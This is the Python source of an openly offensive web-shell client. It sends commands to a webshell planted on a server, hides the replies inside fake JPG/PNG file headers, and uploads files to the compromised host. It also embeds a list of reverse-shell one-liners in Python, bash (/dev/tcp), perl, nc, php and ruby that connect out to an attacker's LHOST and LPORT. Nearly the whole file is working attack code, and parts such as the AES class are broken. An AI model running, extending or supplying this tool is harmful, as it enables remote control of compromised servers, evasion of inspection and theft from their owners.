#!/usr/bin/env python3
#Reworked:
#  Added wrapper detection
#  Interactive client
#  File upload ability
#Needed:
#  Encryption
#  Reverse Shell Handling
#----------------------------------------------------------------------------
#Imports
from argparse import ArgumentParser
from binascii import hexlify,unhexlify
from re import search,sub
from os import path
from json import loads,dumps
from base64 import b64encode,b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
from Crypto.Random import get_random_bytes

def installer(program):
  try:
    from pip import main as pipmain
  except:
    print(f"[!] {program} not installed. Installing with pip")
    exit()
  pipmain(['install', program])
  exit()

try:
  from requests import request as http
except:
  installer("requests")


try:
  from termcolor import colored as color
except:
  installer("termcolor")
#----------------------------------------------------------------------------
#Constants
parser = ArgumentParser()
parser.add_argument("-u", "--url", type=str, required=True, help="URL to webshell")
parser.add_argument("--wrapper", type=str, required=False, help="Filetype wrapper JPG/PNG")
args = parser.parse_args()

filetypes = {
  'png': {'b': b'89504e470d0a1a0a0000000d49484452', 'e': b'00000049454e44ae426082'},
  'jpg': {'b': b'ffd8ffe000004a46494600', 'e': b'ffd9'}
}

revshells = {
  'python': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call("/bin/sh")\'',
  'bash': 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1',
  'perl': 'perl -e \'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
  'nc': 'nc -nv LHOST LPORT -e /bin/bash', #only works with newer nc version
  'php': 'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',
  'ruby': 'ruby -rsocket -e \'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i")\''
 }

helpmenu = """
  revshell tool ip port
  upload {source file} {dest file}
  {command}
  exit
  quit
  help
 """

url = args.url
if args.wrapper and args.wrapper not in filetypes.keys():
  print(f"[!] Wrapper not in: {filetypes.keys()}")
  exit()
elif not args.wrapper:
  wrapper = ""
else: wrapper = args.wrapper

#----------------------------------------------------------------------------
#Main operator classes
class cnc(object):
  def __init__(self, url, wrapper, crypto):
    self.url = url
    self.wrapper = wrapper
    self.tools = self.enumtools()
  def webrequest(self, cmd, customHeaders, customData):
    headers = {"User-Agent": "simpleshell/1.0"}
    data = {"content": cmd}
    headers.update(customHeaders); data.update(customData)
    r = http("POST", self.url, headers=headers, data=data)
    if r.status_code == 404:
      print("[!] No shell at URI")
      exit()
    if r.content.startswith(unhexlify(filetypes['jpg']['b'])): self.wrapper = 'jpg'
    elif r.content.startswith(unhexlify(filetypes['png']['b'])): self.wrapper = 'png'
    if self.wrapper: content = self.unwrap(r.content)
    else: content = r.content.decode()
    return content
  def unwrap(self, wrapped):
    h = hexlify(wrapped)
    beginlen = len(filetypes[self.wrapper]['b'])
    endlen = (len(h)-len(filetypes[self.wrapper]['e']))
    mid = h[beginlen:endlen]
    return unhexlify(mid).decode()
  def enumtools(self):
    cmd = f"which {' '.join(str(v) for v in revshells.keys())}"
    resp = self.webrequest(cmd, {}, {})
    return [v for v in revshells.keys() if search(v, resp)]

class aes(object):
  def __init__(self, key):
    if key: self.key = key
    else: key = get_random_bytes(16)
    self.ciphere = AES.new(key, AES.MODE_CBC)
    self.cipherd = AES.new(key, AES.MODE_CBC, ciphere.iv)

def get_cmd(cmd):
  cmddict = {'cmd': cmd}
  if cmd in ['quit', 'exit']: exit()
  elif cmd == "help":
    print(helpmenu)
  elif not cmd: return cmddict
  elif cmd.startswith("upload") and len(cmd.split()) != 3:
    print("[!] Upload cmd incorrect syntax\n\tupload sourcefile destfile")
  elif cmd.startswith("upload") and not path.isfile(cmd.split()[1]):
    print(f"[!] File {cmd.split()[1]} not found")
  elif cmd.startswith("upload"):
    cmddict['upl'] =  cmd.split()[2]
    cmddict['command'] = fileToHex(cmd.split()[1])
  elif cmd == "tools": print('\n'.join(color(f"  {tool}", 'green') for tool in tools))
  elif cmd.startswith("revshell") and len(cmd.split()) != 4:
    print("[!] Revshell command not recognized")
  elif cmd.startswith("revshell") and cmd.split()[1] not in tools:
      print(f"[!] {cmd.split()[1]} not in tools list")
      print('\n'.join(color(f"  {tool}", 'green') for tool in tools))
  elif cmd.startswith("revshell") and cmd.split()[1] in tools:
    print("not implemented yet.")
    print(revshells[cmd.split()[1]])
    #return {'command': revshells[cmd.split()[1]], 'cmd': cmd}
  else: cmddict['command'] =  cmd
  return cmddict

def fileToHex(fname):  return hexlify( open(fname, 'rb').read() )

#----------------------------------------------------------------------------
#Runcall
run = cnc(url, wrapper, None)
tools = run.tools
while True:
  cmd = input(color(" $ ","blue"))
  cmd = get_cmd(cmd)
  if 'upl' in cmd.keys():
    result = run.webrequest(cmd['command'], {}, {'upl': cmd['upl']})
    print(result)
  elif 'command' in cmd.keys():
    result = run.webrequest(cmd['command'], {}, {})
    print(result)
  else: pass

